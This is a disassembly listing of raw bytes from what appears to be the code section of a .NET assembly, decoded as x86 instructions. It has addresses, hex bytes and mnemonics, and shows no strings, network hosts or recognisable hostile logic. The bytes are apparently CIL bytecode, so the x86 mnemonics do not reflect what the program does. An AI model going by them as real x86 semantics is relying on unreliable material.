  403fed:	cb                   	lret
  403fee:	00 00                	add    %al,(%eax)
  403ff0:	0a 0d 16 13 04 2b    	or     0x2b041316,%cl
  403ff6:	12 09                	adc    (%ecx),%cl
  403ff8:	11 04 93             	adc    %eax,(%ebx,%edx,4)
  403ffb:	0c 07                	or     $0x7,%al
  403ffd:	08 6f cc             	or     %ch,-0x34(%edi)
  404000:	00 00                	add    %al,(%eax)
  404002:	0a 11                	or     (%ecx),%dl
  404004:	04 17                	add    $0x17,%al
  404006:	58                   	pop    %eax
  404007:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40400a:	04 09                	add    $0x9,%al
  40400c:	8e 69 32             	mov    0x32(%ecx),%gs
  40400f:	e7 06                	out    %eax,$0x6
  404011:	7b 21                	jnp    0x404034
  404013:	00 00                	add    %al,(%eax)
  404015:	04 07                	add    $0x7,%al
  404017:	73 cd                	jae    0x403fe6
  404019:	00 00                	add    %al,(%eax)
  40401b:	0a 2a                	or     (%edx),%ch
  40401d:	14 2a                	adc    $0x2a,%al
  40401f:	1e                   	push   %ds
  404020:	02 7b 39             	add    0x39(%ebx),%bh
  404023:	00 00                	add    %al,(%eax)
  404025:	04 2a                	add    $0x2a,%al
  404027:	00 13                	add    %dl,(%ebx)
  404029:	30 03                	xor    %al,(%ebx)
  40402b:	00 29                	add    %ch,(%ecx)
  40402d:	00 00                	add    %al,(%eax)
  40402f:	00 0e                	add    %cl,(%esi)
  404031:	00 00                	add    %al,(%eax)
  404033:	11 72 01             	adc    %esi,0x1(%edx)
  404036:	00 00                	add    %al,(%eax)
  404038:	70 0a                	jo     0x404044
  40403a:	02 7b 39             	add    0x39(%ebx),%bh
  40403d:	00 00                	add    %al,(%eax)
  40403f:	04 6f                	add    $0x6f,%al
  404041:	23 00                	and    (%eax),%eax
  404043:	00 0a                	add    %cl,(%edx)
  404045:	02 7b 44             	add    0x44(%ebx),%bh
  404048:	00 00                	add    %al,(%eax)
  40404a:	04 12                	add    $0x12,%al
  40404c:	00 28                	add    %ch,(%eax)
  40404e:	21 00                	and    %eax,(%eax)
  404050:	00 06                	add    %al,(%esi)
  404052:	17                   	pop    %ss
  404053:	33 02                	xor    (%edx),%eax
  404055:	06                   	push   %es
  404056:	2a 72 01             	sub    0x1(%edx),%dh
  404059:	00 00                	add    %al,(%eax)
  40405b:	70 2a                	jo     0x404087
  40405d:	00 00                	add    %al,(%eax)
  40405f:	00 13                	add    %dl,(%ebx)
  404061:	30 03                	xor    %al,(%ebx)
  404063:	00 70 00             	add    %dh,0x0(%eax)
  404066:	00 00                	add    %al,(%eax)
  404068:	0f 00 00             	sldt   (%eax)
  40406b:	11 73 ca             	adc    %esi,-0x36(%ebx)
  40406e:	00 00                	add    %al,(%eax)
  404070:	0a 0a                	or     (%edx),%cl
  404072:	17                   	pop    %ss
  404073:	28 ce                	sub    %cl,%dh
  404075:	00 00                	add    %al,(%eax)
  404077:	0a 0b                	or     (%ebx),%cl
  404079:	12 01                	adc    (%ecx),%al
  40407b:	28 cf                	sub    %cl,%bh
  40407d:	00 00                	add    %al,(%eax)
  40407f:	0a 1f                	or     (%edi),%bl
  404081:	0d 33 07 28 d0       	or     $0xd0280733,%eax
  404086:	00 00                	add    %al,(%eax)
  404088:	0a 2b                	or     (%ebx),%ch
  40408a:	4f                   	dec    %edi
  40408b:	12 01                	adc    (%ecx),%al
  40408d:	28 cf                	sub    %cl,%bh
  40408f:	00 00                	add    %al,(%eax)
  404091:	0a 1e                	or     (%esi),%bl
  404093:	33 23                	xor    (%ebx),%esp
  404095:	06                   	push   %es
  404096:	6f                   	outsl  %ds:(%esi),(%dx)
  404097:	d1 00                	roll   $1,(%eax)
  404099:	00 0a                	add    %cl,(%edx)
  40409b:	16                   	push   %ss
  40409c:	31 d4                	xor    %edx,%esp
  40409e:	06                   	push   %es
  40409f:	06                   	push   %es
  4040a0:	6f                   	outsl  %ds:(%esi),(%dx)
  4040a1:	d1 00                	roll   $1,(%eax)
  4040a3:	00 0a                	add    %cl,(%edx)
  4040a5:	17                   	pop    %ss
  4040a6:	59                   	pop    %ecx
  4040a7:	6f                   	outsl  %ds:(%esi),(%dx)
  4040a8:	d2 00                	rolb   %cl,(%eax)
  4040aa:	00 0a                	add    %cl,(%edx)
  4040ac:	72 49                	jb     0x4040f7
  4040ae:	02 00                	add    (%eax),%al
  4040b0:	70 28                	jo     0x4040da
  4040b2:	d3 00                	roll   %cl,(%eax)
  4040b4:	00 0a                	add    %cl,(%edx)
  4040b6:	2b ba 12 01 28 d4    	sub    -0x2bd7feee(%edx),%edi
  4040bc:	00 00                	add    %al,(%eax)
  4040be:	0a 2c b1             	or     (%ecx,%esi,4),%ch
  4040c1:	06                   	push   %es
  4040c2:	12 01                	adc    (%ecx),%al
  4040c4:	28 d4                	sub    %dl,%ah
  4040c6:	00 00                	add    %al,(%eax)
  4040c8:	0a 6f cc             	or     -0x34(%edi),%ch
  4040cb:	00 00                	add    %al,(%eax)
  4040cd:	0a 72 51             	or     0x51(%edx),%dh
  4040d0:	02 00                	add    (%eax),%al
  4040d2:	70 28                	jo     0x4040fc
  4040d4:	d3 00                	roll   %cl,(%eax)
  4040d6:	00 0a                	add    %cl,(%edx)
  4040d8:	2b 98 06 2a 13 30    	sub    0x30132a06(%eax),%ebx
  4040de:	04 00                	add    $0x0,%al
  4040e0:	51                   	push   %ecx
  4040e1:	00 00                	add    %al,(%eax)
  4040e3:	00 10                	add    %dl,(%eax)
  4040e5:	00 00                	add    %al,(%eax)
  4040e7:	11 73 ca             	adc    %esi,-0x36(%ebx)
  4040ea:	00 00                	add    %al,(%eax)
  4040ec:	0a 0a                	or     (%edx),%cl
  4040ee:	72 01                	jb     0x4040f1
  4040f0:	00 00                	add    %al,(%eax)
  4040f2:	70 0b                	jo     0x4040ff
  4040f4:	02 7b 39             	add    0x39(%ebx),%bh
  4040f7:	00 00                	add    %al,(%eax)
  4040f9:	04 6f                	add    $0x6f,%al
  4040fb:	23 00                	and    (%eax),%eax
  4040fd:	00 0a                	add    %cl,(%edx)
  4040ff:	02 7b 44             	add    0x44(%ebx),%bh
  404102:	00 00                	add    %al,(%eax)
  404104:	04 12                	add    $0x12,%al
  404106:	01 17                	add    %edx,(%edi)
  404108:	28 20                	sub    %ah,(%eax)
  40410a:	00 00                	add    %al,(%eax)
  40410c:	06                   	push   %es
  40410d:	17                   	pop    %ss
  40410e:	33 27                	xor    (%edi),%esp
  404110:	07                   	pop    %es
  404111:	0d 16 13 04 2b       	or     $0x2b041316,%eax
  404116:	16                   	push   %ss
  404117:	09 11                	or     %edx,(%ecx)
  404119:	04 6f                	add    $0x6f,%al
  40411b:	6c                   	insb   (%dx),%es:(%edi)
  40411c:	00 00                	add    %al,(%eax)
  40411e:	0a 0c 06             	or     (%esi,%eax,1),%cl
  404121:	08 6f cc             	or     %ch,-0x34(%edi)
  404124:	00 00                	add    %al,(%eax)
  404126:	0a 11                	or     (%ecx),%dl
  404128:	04 17                	add    $0x17,%al
  40412a:	58                   	pop    %eax
  40412b:	13 04 11             	adc    (%ecx,%edx,1),%eax
  40412e:	04 09                	add    $0x9,%al
  404130:	6f                   	outsl  %ds:(%esi),(%dx)
  404131:	d5 00                	aad    $0x0
  404133:	00 0a                	add    %cl,(%edx)
  404135:	32 e0                	xor    %al,%ah
  404137:	06                   	push   %es
  404138:	2a 06                	sub    (%esi),%al
  40413a:	2a 06                	sub    (%esi),%al
  40413c:	2a 06                	sub    (%esi),%al
  40413e:	2a 06                	sub    (%esi),%al
  404140:	2a 06                	sub    (%esi),%al
  404142:	2a 06                	sub    (%esi),%al
  404144:	2a 06                	sub    (%esi),%al
  404146:	2a 00                	sub    (%eax),%al
  404148:	03 30                	add    (%eax),%esi
  40414a:	03 00                	add    (%eax),%eax
  40414c:	63 00                	arpl   %eax,(%eax)
  40414e:	00 00                	add    %al,(%eax)
  404150:	00 00                	add    %al,(%eax)
  404152:	00 00                	add    %al,(%eax)
  404154:	02 7b 45             	add    0x45(%ebx),%bh
  404157:	00 00                	add    %al,(%eax)
  404159:	04 2d                	add    $0x2d,%al
  40415b:	31 04 6f             	xor    %eax,(%edi,%ebp,2)
  40415e:	94                   	xchg   %eax,%esp
  40415f:	00 00                	add    %al,(%eax)
  404161:	0a 17                	or     (%edi),%dl
  404163:	33 01                	xor    (%ecx),%eax
  404165:	2a 02                	sub    (%edx),%al
  404167:	02 7b 39             	add    0x39(%ebx),%bh
  40416a:	00 00                	add    %al,(%eax)
  40416c:	04 6f                	add    $0x6f,%al
  40416e:	23 00                	and    (%eax),%eax
  404170:	00 0a                	add    %cl,(%edx)
  404172:	02 7b 42             	add    0x42(%ebx),%bh
  404175:	00 00                	add    %al,(%eax)
  404177:	04 73                	add    $0x73,%al
  404179:	2f                   	das
  40417a:	00 00                	add    %al,(%eax)
  40417c:	06                   	push   %es
  40417d:	7d 45                	jge    0x4041c4
  40417f:	00 00                	add    %al,(%eax)
  404181:	04 02                	add    $0x2,%al
  404183:	7b 45                	jnp    0x4041ca
  404185:	00 00                	add    %al,(%eax)
  404187:	04 6f                	add    $0x6f,%al
  404189:	d6                   	salc
  40418a:	00 00                	add    %al,(%eax)
  40418c:	0a 02                	or     (%edx),%al
  40418e:	7b 45                	jnp    0x4041d5
  404190:	00 00                	add    %al,(%eax)
  404192:	04 04                	add    $0x4,%al
  404194:	6f                   	outsl  %ds:(%esi),(%dx)
  404195:	34 00                	xor    $0x0,%al
  404197:	00 06                	add    %al,(%esi)
  404199:	04 6f                	add    $0x6f,%al
  40419b:	94                   	xchg   %eax,%esp
  40419c:	00 00                	add    %al,(%eax)
  40419e:	0a 17                	or     (%edi),%dl
  4041a0:	33 14 02             	xor    (%edx,%eax,1),%edx
  4041a3:	7b 45                	jnp    0x4041ea
  4041a5:	00 00                	add    %al,(%eax)
  4041a7:	04 6f                	add    $0x6f,%al
  4041a9:	33 00                	xor    (%eax),%eax
  4041ab:	00 06                	add    %al,(%esi)
  4041ad:	2d 07 02 14 7d       	sub    $0x7d140207,%eax
  4041b2:	45                   	inc    %ebp
  4041b3:	00 00                	add    %al,(%eax)
  4041b5:	04 2a                	add    $0x2a,%al
  4041b7:	06                   	push   %es
  4041b8:	2a 06                	sub    (%esi),%al
  4041ba:	2a 00                	sub    (%eax),%al
  4041bc:	03 30                	add    (%eax),%esi
  4041be:	02 00                	add    (%eax),%al
  4041c0:	40                   	inc    %eax
  4041c1:	00 00                	add    %al,(%eax)
  4041c3:	00 00                	add    %al,(%eax)
  4041c5:	00 00                	add    %al,(%eax)
  4041c7:	00 02                	add    %al,(%edx)
  4041c9:	28 d7                	sub    %dl,%bh
  4041cb:	00 00                	add    %al,(%eax)
  4041cd:	0a 6f d8             	or     -0x28(%edi),%ch
  4041d0:	00 00                	add    %al,(%eax)
  4041d2:	0a 7d 48             	or     0x48(%ebp),%bh
  4041d5:	00 00                	add    %al,(%eax)
  4041d7:	04 02                	add    $0x2,%al
  4041d9:	28 d7                	sub    %dl,%bh
  4041db:	00 00                	add    %al,(%eax)
  4041dd:	0a 6f d9             	or     -0x27(%edi),%ch
  4041e0:	00 00                	add    %al,(%eax)
  4041e2:	0a 7d 49             	or     0x49(%ebp),%bh
  4041e5:	00 00                	add    %al,(%eax)
  4041e7:	04 02                	add    $0x2,%al
  4041e9:	28 da                	sub    %bl,%dl
  4041eb:	00 00                	add    %al,(%eax)
  4041ed:	0a 7d 4a             	or     0x4a(%ebp),%bh
  4041f0:	00 00                	add    %al,(%eax)
  4041f2:	04 02                	add    $0x2,%al
  4041f4:	28 db                	sub    %bl,%bl
  4041f6:	00 00                	add    %al,(%eax)
  4041f8:	0a 02                	or     (%edx),%al
  4041fa:	03 7d 46             	add    0x46(%ebp),%edi
  4041fd:	00 00                	add    %al,(%eax)
  4041ff:	04 02                	add    $0x2,%al
  404201:	04 7d                	add    $0x7d,%al
  404203:	47                   	inc    %edi
  404204:	00 00                	add    %al,(%eax)
  404206:	04 2a                	add    $0x2a,%al
  404208:	13 30                	adc    (%eax),%esi
  40420a:	03 00                	add    (%eax),%eax
  40420c:	2e 00 00             	add    %al,%cs:(%eax)
  40420f:	00 11                	add    %dl,(%ecx)
  404211:	00 00                	add    %al,(%eax)
  404213:	11 02                	adc    %eax,(%edx)
  404215:	7b 47                	jnp    0x40425e
  404217:	00 00                	add    %al,(%eax)
  404219:	04 2d                	add    $0x2d,%al
  40421b:	02 14 2a             	add    (%edx,%ebp,1),%dl
  40421e:	02 7b 4b             	add    0x4b(%ebx),%bh
  404221:	00 00                	add    %al,(%eax)
  404223:	04 25                	add    $0x25,%al
  404225:	2d 1a 26 02 02       	sub    $0x202261a,%eax
  40422a:	7b 47                	jnp    0x404273
  40422c:	00 00                	add    %al,(%eax)
  40422e:	04 73                	add    $0x73,%al
  404230:	55                   	push   %ebp
  404231:	00 00                	add    %al,(%eax)
  404233:	06                   	push   %es
  404234:	28 dc                	sub    %bl,%ah
  404236:	00 00                	add    %al,(%eax)
  404238:	0a 25 0a 7d 4b 00    	or     0x4b7d0a,%ah
  40423e:	00 04 06             	add    %al,(%esi,%eax,1)
  404241:	2a 1e                	sub    (%esi),%bl
  404243:	02 7b 48             	add    0x48(%ebx),%bh
  404246:	00 00                	add    %al,(%eax)
  404248:	04 2a                	add    $0x2a,%al
  40424a:	1e                   	push   %ds
  40424b:	02 7b 49             	add    0x49(%ebx),%bh
  40424e:	00 00                	add    %al,(%eax)
  404250:	04 2a                	add    $0x2a,%al
  404252:	1e                   	push   %ds
  404253:	02 7b 4a             	add    0x4a(%ebx),%bh
  404256:	00 00                	add    %al,(%eax)
  404258:	04 2a                	add    $0x2a,%al
  40425a:	1a 72 55             	sbb    0x55(%edx),%dh
  40425d:	02 00                	add    (%eax),%al
  40425f:	70 2a                	jo     0x40428b
  404261:	1e                   	push   %ds
  404262:	02 7b 47             	add    0x47(%ebx),%bh
  404265:	00 00                	add    %al,(%eax)
  404267:	04 2a                	add    $0x2a,%al
  404269:	2e 16                	cs push %ss
  40426b:	1b 16                	sbb    (%esi),%edx
  40426d:	1f                   	pop    %ds
  40426e:	21 73 dd             	and    %esi,-0x23(%ebx)
  404271:	00 00                	add    %al,(%eax)
  404273:	0a 2a                	or     (%edx),%ch
  404275:	06                   	push   %es
  404276:	2a 06                	sub    (%esi),%al
  404278:	2a 06                	sub    (%esi),%al
  40427a:	2a 06                	sub    (%esi),%al
  40427c:	2a 66 02             	sub    0x2(%esi),%ah
  40427f:	7b 46                	jnp    0x4042c7
  404281:	00 00                	add    %al,(%eax)
  404283:	04 17                	add    $0x17,%al
  404285:	6f                   	outsl  %ds:(%esi),(%dx)
  404286:	6b 00 00             	imul   $0x0,(%eax),%eax
  404289:	06                   	push   %es
  40428a:	02 7b 46             	add    0x46(%ebx),%bh
  40428d:	00 00                	add    %al,(%eax)
  40428f:	04 03                	add    $0x3,%al
  404291:	6f                   	outsl  %ds:(%esi),(%dx)
  404292:	6d                   	insl   (%dx),%es:(%edi)
  404293:	00 00                	add    %al,(%eax)
  404295:	06                   	push   %es
  404296:	2a 72 02             	sub    0x2(%edx),%dh
  404299:	28 11                	sub    %dl,(%ecx)
  40429b:	00 00                	add    %al,(%eax)
  40429d:	0a 03                	or     (%ebx),%al
  40429f:	2d 0b 72 75 02       	sub    $0x275720b,%eax
  4042a4:	00 70 73             	add    %dh,0x73(%eax)
  4042a7:	de 00                	fiadds (%eax)
  4042a9:	00 0a                	add    %cl,(%edx)
  4042ab:	7a 02                	jp     0x4042af
  4042ad:	03 7d 4c             	add    0x4c(%ebp),%edi
  4042b0:	00 00                	add    %al,(%eax)
  4042b2:	04 2a                	add    $0x2a,%al
  4042b4:	32 02                	xor    (%edx),%al
  4042b6:	7b 4c                	jnp    0x404304
  4042b8:	00 00                	add    %al,(%eax)
  4042ba:	04 7b                	add    $0x7b,%al
  4042bc:	3a 00                	cmp    (%eax),%al
  4042be:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4042c1:	36 02 7b 4c          	add    %ss:0x4c(%ebx),%bh
  4042c5:	00 00                	add    %al,(%eax)
  4042c7:	04 03                	add    $0x3,%al
  4042c9:	7d 3a                	jge    0x404305
  4042cb:	00 00                	add    %al,(%eax)
  4042cd:	04 2a                	add    $0x2a,%al
  4042cf:	32 02                	xor    (%edx),%al
  4042d1:	7b 4c                	jnp    0x40431f
  4042d3:	00 00                	add    %al,(%eax)
  4042d5:	04 7b                	add    $0x7b,%al
  4042d7:	3b 00                	cmp    (%eax),%eax
  4042d9:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4042dc:	36 02 7b 4c          	add    %ss:0x4c(%ebx),%bh
  4042e0:	00 00                	add    %al,(%eax)
  4042e2:	04 03                	add    $0x3,%al
  4042e4:	7d 3b                	jge    0x404321
  4042e6:	00 00                	add    %al,(%eax)
  4042e8:	04 2a                	add    $0x2a,%al
  4042ea:	32 02                	xor    (%edx),%al
  4042ec:	7b 4c                	jnp    0x40433a
  4042ee:	00 00                	add    %al,(%eax)
  4042f0:	04 7b                	add    $0x7b,%al
  4042f2:	3c 00                	cmp    $0x0,%al
  4042f4:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4042f7:	36 02 7b 4c          	add    %ss:0x4c(%ebx),%bh
  4042fb:	00 00                	add    %al,(%eax)
  4042fd:	04 03                	add    $0x3,%al
  4042ff:	7d 3c                	jge    0x40433d
  404301:	00 00                	add    %al,(%eax)
  404303:	04 2a                	add    $0x2a,%al
  404305:	32 02                	xor    (%edx),%al
  404307:	7b 4c                	jnp    0x404355
  404309:	00 00                	add    %al,(%eax)
  40430b:	04 7b                	add    $0x7b,%al
  40430d:	3d 00 00 04 2a       	cmp    $0x2a040000,%eax
  404312:	36 02 7b 4c          	add    %ss:0x4c(%ebx),%bh
  404316:	00 00                	add    %al,(%eax)
  404318:	04 03                	add    $0x3,%al
  40431a:	7d 3d                	jge    0x404359
  40431c:	00 00                	add    %al,(%eax)
  40431e:	04 2a                	add    $0x2a,%al
  404320:	32 02                	xor    (%edx),%al
  404322:	7b 4c                	jnp    0x404370
  404324:	00 00                	add    %al,(%eax)
  404326:	04 7b                	add    $0x7b,%al
  404328:	3e 00 00             	add    %al,%ds:(%eax)
  40432b:	04 2a                	add    $0x2a,%al
  40432d:	36 02 7b 4c          	add    %ss:0x4c(%ebx),%bh
  404331:	00 00                	add    %al,(%eax)
  404333:	04 03                	add    $0x3,%al
  404335:	7d 3e                	jge    0x404375
  404337:	00 00                	add    %al,(%eax)
  404339:	04 2a                	add    $0x2a,%al
  40433b:	32 02                	xor    (%edx),%al
  40433d:	7b 4c                	jnp    0x40438b
  40433f:	00 00                	add    %al,(%eax)
  404341:	04 7b                	add    $0x7b,%al
  404343:	3f                   	aas
  404344:	00 00                	add    %al,(%eax)
  404346:	04 2a                	add    $0x2a,%al
  404348:	36 02 7b 4c          	add    %ss:0x4c(%ebx),%bh
  40434c:	00 00                	add    %al,(%eax)
  40434e:	04 03                	add    $0x3,%al
  404350:	7d 3f                	jge    0x404391
  404352:	00 00                	add    %al,(%eax)
  404354:	04 2a                	add    $0x2a,%al
  404356:	32 02                	xor    (%edx),%al
  404358:	7b 4c                	jnp    0x4043a6
  40435a:	00 00                	add    %al,(%eax)
  40435c:	04 7b                	add    $0x7b,%al
  40435e:	40                   	inc    %eax
  40435f:	00 00                	add    %al,(%eax)
  404361:	04 2a                	add    $0x2a,%al
  404363:	36 02 7b 4c          	add    %ss:0x4c(%ebx),%bh
  404367:	00 00                	add    %al,(%eax)
  404369:	04 03                	add    $0x3,%al
  40436b:	7d 40                	jge    0x4043ad
  40436d:	00 00                	add    %al,(%eax)
  40436f:	04 2a                	add    $0x2a,%al
  404371:	32 02                	xor    (%edx),%al
  404373:	7b 4c                	jnp    0x4043c1
  404375:	00 00                	add    %al,(%eax)
  404377:	04 7b                	add    $0x7b,%al
  404379:	41                   	inc    %ecx
  40437a:	00 00                	add    %al,(%eax)
  40437c:	04 2a                	add    $0x2a,%al
  40437e:	36 02 7b 4c          	add    %ss:0x4c(%ebx),%bh
  404382:	00 00                	add    %al,(%eax)
  404384:	04 03                	add    $0x3,%al
  404386:	7d 41                	jge    0x4043c9
  404388:	00 00                	add    %al,(%eax)
  40438a:	04 2a                	add    $0x2a,%al
  40438c:	32 02                	xor    (%edx),%al
  40438e:	7b 4c                	jnp    0x4043dc
  404390:	00 00                	add    %al,(%eax)
  404392:	04 7b                	add    $0x7b,%al
  404394:	42                   	inc    %edx
  404395:	00 00                	add    %al,(%eax)
  404397:	04 2a                	add    $0x2a,%al
  404399:	36 02 7b 4c          	add    %ss:0x4c(%ebx),%bh
  40439d:	00 00                	add    %al,(%eax)
  40439f:	04 03                	add    $0x3,%al
  4043a1:	7d 42                	jge    0x4043e5
  4043a3:	00 00                	add    %al,(%eax)
  4043a5:	04 2a                	add    $0x2a,%al
  4043a7:	32 02                	xor    (%edx),%al
  4043a9:	7b 4c                	jnp    0x4043f7
  4043ab:	00 00                	add    %al,(%eax)
  4043ad:	04 7b                	add    $0x7b,%al
  4043af:	43                   	inc    %ebx
  4043b0:	00 00                	add    %al,(%eax)
  4043b2:	04 2a                	add    $0x2a,%al
  4043b4:	36 02 7b 4c          	add    %ss:0x4c(%ebx),%bh
  4043b8:	00 00                	add    %al,(%eax)
  4043ba:	04 03                	add    $0x3,%al
  4043bc:	7d 43                	jge    0x404401
  4043be:	00 00                	add    %al,(%eax)
  4043c0:	04 2a                	add    $0x2a,%al
  4043c2:	1e                   	push   %ds
  4043c3:	02 7b 4d             	add    0x4d(%ebx),%bh
  4043c6:	00 00                	add    %al,(%eax)
  4043c8:	04 2a                	add    $0x2a,%al
  4043ca:	22 02                	and    (%edx),%al
  4043cc:	03 7d 4d             	add    0x4d(%ebp),%edi
  4043cf:	00 00                	add    %al,(%eax)
  4043d1:	04 2a                	add    $0x2a,%al
  4043d3:	1e                   	push   %ds
  4043d4:	02 7b 4e             	add    0x4e(%ebx),%bh
  4043d7:	00 00                	add    %al,(%eax)
  4043d9:	04 2a                	add    $0x2a,%al
  4043db:	22 02                	and    (%edx),%al
  4043dd:	03 7d 4e             	add    0x4e(%ebp),%edi
  4043e0:	00 00                	add    %al,(%eax)
  4043e2:	04 2a                	add    $0x2a,%al
  4043e4:	1e                   	push   %ds
  4043e5:	02 28                	add    (%eax),%ch
  4043e7:	11 00                	adc    %eax,(%eax)
  4043e9:	00 0a                	add    %cl,(%edx)
  4043eb:	2a 9e 02 7b 4f 00    	sub    0x4f7b02(%esi),%bl
  4043f1:	00 04 03             	add    %al,(%ebx,%eax,1)
  4043f4:	74 08                	je     0x4043fe
  4043f6:	00 00                	add    %al,(%eax)
  4043f8:	1b 04 6f             	sbb    (%edi,%ebp,2),%eax
  4043fb:	e0 00                	loopne 0x4043fd
  4043fd:	00 0a                	add    %cl,(%edx)
  4043ff:	6f                   	outsl  %ds:(%esi),(%dx)
  404400:	e1 00                	loope  0x404402
  404402:	00 0a                	add    %cl,(%edx)
  404404:	6f                   	outsl  %ds:(%esi),(%dx)
  404405:	e2 00                	loop   0x404407
  404407:	00 0a                	add    %cl,(%edx)
  404409:	6f                   	outsl  %ds:(%esi),(%dx)
  40440a:	e3 00                	jecxz  0x40440c
  40440c:	00 0a                	add    %cl,(%edx)
  40440e:	6f                   	outsl  %ds:(%esi),(%dx)
  40440f:	e4 00                	in     $0x0,%al
  404411:	00 0a                	add    %cl,(%edx)
  404413:	2a 8a 02 7b 4f 00    	sub    0x4f7b02(%edx),%cl
  404419:	00 04 03             	add    %al,(%ebx,%eax,1)
  40441c:	74 09                	je     0x404427
  40441e:	00 00                	add    %al,(%eax)
  404420:	1b 04 6f             	sbb    (%edi,%ebp,2),%eax
  404423:	e0 00                	loopne 0x404425
  404425:	00 0a                	add    %cl,(%edx)
  404427:	6f                   	outsl  %ds:(%esi),(%dx)
  404428:	e5 00                	in     $0x0,%eax
  40442a:	00 0a                	add    %cl,(%edx)
  40442c:	6f                   	outsl  %ds:(%esi),(%dx)
  40442d:	10 00                	adc    %al,(%eax)
  40442f:	00 0a                	add    %cl,(%edx)
  404431:	6f                   	outsl  %ds:(%esi),(%dx)
  404432:	c5 00                	lds    (%eax),%eax
  404434:	00 0a                	add    %cl,(%edx)
  404436:	2a 56 03             	sub    0x3(%esi),%dl
  404439:	6f                   	outsl  %ds:(%esi),(%dx)
  40443a:	e6 00                	out    %al,$0x0
  40443c:	00 0a                	add    %cl,(%edx)
  40443e:	2c 0c                	sub    $0xc,%al
  404440:	02 7b 50             	add    0x50(%ebx),%bh
  404443:	00 00                	add    %al,(%eax)
  404445:	04 6f                	add    $0x6f,%al
  404447:	e7 00                	out    %eax,$0x0
  404449:	00 0a                	add    %cl,(%edx)
  40444b:	26 2a 00             	sub    %es:(%eax),%al
  40444e:	00 00                	add    %al,(%eax)
  404450:	1b 30                	sbb    (%eax),%esi
  404452:	06                   	push   %es
  404453:	00 cd                	add    %cl,%ch
  404455:	05 00 00 12 00       	add    $0x120000,%eax
  40445a:	00 11                	add    %dl,(%ecx)
  40445c:	14 13                	adc    $0x13,%al
  40445e:	18 14 13             	sbb    %dl,(%ebx,%edx,1)
  404461:	19 14 13             	sbb    %edx,(%ebx,%edx,1)
  404464:	1a 73 75             	sbb    0x75(%ebx),%dh
  404467:	00 00                	add    %al,(%eax)
  404469:	06                   	push   %es
  40446a:	13 1b                	adc    (%ebx),%ebx
  40446c:	28 e8                	sub    %ch,%al
  40446e:	00 00                	add    %al,(%eax)
  404470:	0a 73 74             	or     0x74(%ebx),%dh
  404473:	00 00                	add    %al,(%eax)
  404475:	06                   	push   %es
  404476:	0a 16                	or     (%esi),%dl
  404478:	0b 7e 14             	or     0x14(%esi),%edi
  40447b:	00 00                	add    %al,(%eax)
  40447d:	0a 0c 11             	or     (%ecx,%edx,1),%cl
  404480:	1b 73 35             	sbb    0x35(%ebx),%esi
  404483:	00 00                	add    %al,(%eax)
  404485:	06                   	push   %es
  404486:	7d 4f                	jge    0x4044d7
  404488:	00 00                	add    %al,(%eax)
  40448a:	04 06                	add    $0x6,%al
  40448c:	11 1b                	adc    %ebx,(%ebx)
  40448e:	7b 4f                	jnp    0x4044df
  404490:	00 00                	add    %al,(%eax)
  404492:	04 73                	add    $0x73,%al
  404494:	48                   	dec    %eax
  404495:	00 00                	add    %al,(%eax)
  404497:	06                   	push   %es
  404498:	0d 11 1b 16 73       	or     $0x73161b11,%eax
  40449d:	e9 00 00 0a 7d       	jmp    0x7d4a44a2
  4044a2:	50                   	push   %eax
  4044a3:	00 00                	add    %al,(%eax)
  4044a5:	04 28                	add    $0x28,%al
  4044a7:	28 00                	sub    %al,(%eax)
  4044a9:	00 0a                	add    %cl,(%edx)
  4044ab:	14 fe                	adc    $0xfe,%al
  4044ad:	06                   	push   %es
  4044ae:	73 00                	jae    0x4044b0
  4044b0:	00 06                	add    %al,(%esi)
  4044b2:	73 ea                	jae    0x40449e
  4044b4:	00 00                	add    %al,(%eax)
  4044b6:	0a 6f eb             	or     -0x15(%edi),%ch
  4044b9:	00 00                	add    %al,(%eax)
  4044bb:	0a 09                	or     (%ecx),%cl
  4044bd:	28 ec                	sub    %ch,%ah
  4044bf:	00 00                	add    %al,(%eax)
  4044c1:	0a 13                	or     (%ebx),%dl
  4044c3:	04 11                	add    $0x11,%al
  4044c5:	04 16                	add    $0x16,%al
  4044c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4044c8:	ed                   	in     (%dx),%eax
  4044c9:	00 00                	add    %al,(%eax)
  4044cb:	0a 11                	or     (%ecx),%dl
  4044cd:	04 6f                	add    $0x6f,%al
  4044cf:	ee                   	out    %al,(%dx)
  4044d0:	00 00                	add    %al,(%eax)
  4044d2:	0a 28                	or     (%eax),%ch
  4044d4:	ef                   	out    %eax,(%dx)
  4044d5:	00 00                	add    %al,(%eax)
  4044d7:	0a 13                	or     (%ebx),%dl
  4044d9:	05 11 05 11 04       	add    $0x4110511,%eax
  4044de:	6f                   	outsl  %ds:(%esi),(%dx)
  4044df:	f0 00 00             	lock add %al,(%eax)
  4044e2:	0a 11                	or     (%ecx),%dl
  4044e4:	05 6f f1 00 00       	add    $0xf16f,%eax
  4044e9:	0a 6f f2             	or     -0xe(%edi),%ch
  4044ec:	00 00                	add    %al,(%eax)
  4044ee:	0a 11                	or     (%ecx),%dl
  4044f0:	18 2d 0f 11 1b fe    	sbb    %ch,0xfe1b110f
  4044f6:	06                   	push   %es
  4044f7:	76 00                	jbe    0x4044f9
  4044f9:	00 06                	add    %al,(%esi)
  4044fb:	73 f3                	jae    0x4044f0
  4044fd:	00 00                	add    %al,(%eax)
  4044ff:	0a 13                	or     (%ebx),%dl
  404501:	18 11                	sbb    %dl,(%ecx)
  404503:	18 6f f4             	sbb    %ch,-0xc(%edi)
  404506:	00 00                	add    %al,(%eax)
  404508:	0a 73 f5             	or     -0xb(%ebx),%dh
  40450b:	00 00                	add    %al,(%eax)
  40450d:	0a 13                	or     (%ebx),%dl
  40450f:	06                   	push   %es
  404510:	28 f6                	sub    %dh,%dh
  404512:	00 00                	add    %al,(%eax)
  404514:	0a 2c 1c             	or     (%esp,%ebx,1),%ch
  404517:	72 01                	jb     0x40451a
  404519:	00 00                	add    %al,(%eax)
  40451b:	70 13                	jo     0x404530
  40451d:	07                   	pop    %es
  40451e:	2b 09                	sub    (%ecx),%ecx
  404520:	11 06                	adc    %eax,(%esi)
  404522:	11 07                	adc    %eax,(%edi)
  404524:	6f                   	outsl  %ds:(%esi),(%dx)
  404525:	f7 00 00 0a 28 f8    	testl  $0xf8280a00,(%eax)
  40452b:	00 00                	add    %al,(%eax)
  40452d:	0a 25 13 07 2d ed    	or     0xed2d0713,%ah
